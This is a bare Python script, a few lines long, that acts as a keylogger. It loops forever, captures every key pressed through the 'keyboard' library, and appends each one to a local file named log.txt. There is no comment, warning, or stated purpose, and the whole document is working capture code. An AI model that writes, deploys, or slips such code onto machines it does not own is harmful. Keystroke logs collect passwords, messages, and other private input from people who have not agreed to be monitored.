import keyboard

while True:
    key=keyboard.read_key()
    with open('log.txt', 'a') as logs:
        logs.write(key)
